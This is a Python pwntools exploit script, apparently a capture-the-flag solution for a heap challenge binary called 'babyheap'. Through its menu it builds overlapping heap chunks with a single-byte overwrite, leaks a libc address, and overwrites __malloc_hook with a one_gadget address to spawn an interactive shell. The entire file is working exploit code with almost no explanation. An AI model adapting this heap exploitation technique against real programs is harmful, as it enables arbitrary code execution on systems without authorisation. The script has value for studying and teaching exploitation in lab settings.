#!/usr/bin/env python
from pwn import *
context.arch='amd64'
context.log_level='debug'
# context.level='debug'
context.terminal = ['tmux','new-window']
# context.terminal = ['tmux', 'splitw', '-h']

ru=lambda s:p.recvuntil(s)
sd=lambda s:p.send(s)
sl=lambda s:p.sendline(s)

def add(size,content='\n'):
    ru('> ')
    sl('M')
    ru('> ')
    sl(str(size))
    ru('> ')
    sd(content)

def show(index):
    ru('> ')
    sl('S')
    ru('> ')
    sl(str(index))

def delete(index):
    ru('> ')
    sl('F')
    ru('> ')
    sl(str(index))

def log_out(i=0):
    ru('> ')
    sl(str(0))

def debugf(payload=''):
    gdb.attach(p,payload)


env={
        'LD_PRELOAD':'./libc.so'
}
p=process('./babyheap',env=env)



add(0xf9)        
add(0xf8)         # --> 0x180
add(0xf9,'a'*0x78+p16(0x101)+'\n')        # 2  can not free
add(0xf9)          # will be overlap   
add(0xf9)        
add(0xf9)         
add(0xf9)         
add(0xf9)         
add(0xf9)
delete(0)

add(0x178,'a'*0x178+'\x81'*2)

for i in range(9):
    if i==1 or i==2:
        continue
    delete(i)

delete(1)
# delete(2)

add(1)         

show(2)            # leak libc
libc_addr=u64(p.recvline()[0:6].ljust(8,'\x00'))
libc_base=libc_addr-0x1e4ca0
print(hex(libc_addr))
print(hex(libc_base))
# pause()
one_off=0xe237f
one_off=0xe2383
one_off=0xe2386
one_off=0x106ef8
one=libc_base+one_off
malloc_hook=libc_base+0x1e4c30
# debugf()

for i in range(7):
        add(0x1)
for i in range(9):
        if i!=0 and i!=2:
                delete(i)
delete(0)

for i in range(7):
        add(0xf9)     # 0--7 expect 2

add(0x100,'a'*0xf8+p16(0x180*3+1)+'\n')      # 6
delete(2)         # 8 can not free or it will error 
add(0xf9)         # 2

# for i in range(9):
        # if i!=8 and i!=6:
                # delete(i)
add(0xf9)
for i in range(5):
        delete(i)

delete(6)
delete(9)
add(0xf9,p64(malloc_hook)[0:6]+'\n')
add(0xf9)
add(0xf9,p64(one)[0:6]+'\n')
# add(0xf9)
# menu(1)
ru('> ')
sl('M')
ru('> ')
sl('1')

p.interactive()